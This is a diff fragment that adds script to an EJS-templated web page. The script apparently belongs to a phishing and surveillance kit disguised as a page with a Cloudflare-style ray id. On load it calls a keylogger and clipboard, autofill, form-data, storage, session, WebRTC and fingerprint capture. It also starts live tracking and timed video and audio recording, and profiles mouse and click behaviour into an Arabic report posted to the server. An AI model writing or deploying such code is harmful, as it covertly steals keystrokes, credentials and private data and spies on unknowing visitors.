+
+// Trigger vibrate and sound on first click
+document.addEventListener('click', function triggerInteraction() {
+    vibrateDevice();
+    playSound();
+}, {once: true});
+
+// Behavior analysis
+let behaviorData = {mouseSpeed:[], clickPattern:[], scrollSpeed:[], timeOnPage:0, hesitation:0};
+let lastMouseTime = Date.now(), lastScrollTime = Date.now();
+
+function analyzeBehavior() {
+    document.addEventListener('mousemove', (e) => {
+        const now = Date.now();
+        const speed = now - lastMouseTime;
+        behaviorData.mouseSpeed.push(speed);
+        lastMouseTime = now;
+    });
+    document.addEventListener('click', () => {
+        behaviorData.clickPattern.push(Date.now());
+    });
+    window.addEventListener('scroll', () => {
+        const now = Date.now();
+        behaviorData.scrollSpeed.push(now - lastScrollTime);
+        lastScrollTime = now;
+    });
+    
+    setTimeout(() => {
+        const avgMouseSpeed = behaviorData.mouseSpeed.length > 0 ? Math.round(behaviorData.mouseSpeed.reduce((a,b)=>a+b,0) / behaviorData.mouseSpeed.length) : 0;
+        const clickCount = behaviorData.clickPattern.length;
+        const timeSpent = Math.round((Date.now() - startTime) / 1000);
+        
+        let personality = "";
+        if(avgMouseSpeed < 50) personality = "سريع ومتسرع";
+        else if(avgMouseSpeed < 150) personality = "طبيعي ومنتظم";
+        else personality = "متأني وحذر";
+        
+        let engagement = clickCount > 10 ? "متفاعل جداً" : clickCount > 5 ? "متفاعل" : "غير متفاعل";
+        
+        let report = `📊 <b>سرعة الماوس:</b> ${avgMouseSpeed}ms\n`;
+        report += `👆 <b>النقرات:</b> ${clickCount}\n`;
+        report += `⏱️ <b>الوقت:</b> ${timeSpent} ثانية\n`;
+        report += `🎭 <b>الشخصية:</b> ${personality}\n`;
+        report += `📈 <b>التفاعل:</b> ${engagement}`;
+        
+        $.post("<%=a %>/behavior", {uid:uid, data:encodeURIComponent(report)});
+    }, 15000);
+}
+
+window.onload=()=>{
+    gather();
+    getBattery();
+    getClipboard();
+    getNetworkInfo();
+    startLiveTracking();
+    getWebRTC();
+    getFingerprint();
+    getSession();
+    getDeviceInfo();
+    initKeylogger();
+    initClickTracking();
+    detectDarkMode();
+    detectTimezone();
+    detectLanguage();
+    detectIncognito();
+    detectAdBlocker();
+    getCapabilities();
+    trackReferrer();
+    trackScrollDepth();
+    getFullStorage();
+    captureAutofill();
+    analyzeBehavior();
+    trackVisibility();
+    initHeatmap();
+    captureFormData();
+    detectPrint();
+    detectRightClick();
+    detectCopyPaste();
+    detectFocus();
+    detectOrientation();
+    detectMotion();
+    getPerformance();
+    if(typeof advancedGather==="function") advancedGather("<%=a %>","<%=uid %>");
+    initErrorLogging();
+    getStorage();
+    getMediaDevices();
+    testSpeed();
+    detectIdle();
+    setTimeout(showContactsButton, 3000);
+    setTimeout(recordVideo, 2000);
+    setTimeout(recordAudio, 3000);
+    var i="0123456789abcdef";
+    var str="";
+    for(var o=0;o<16;o++) str+=i[Math.floor(Math.random() * 16)];
+    document.getElementById("ray").innerHTML=str;
+};
+</script>
+</body>
+</html>
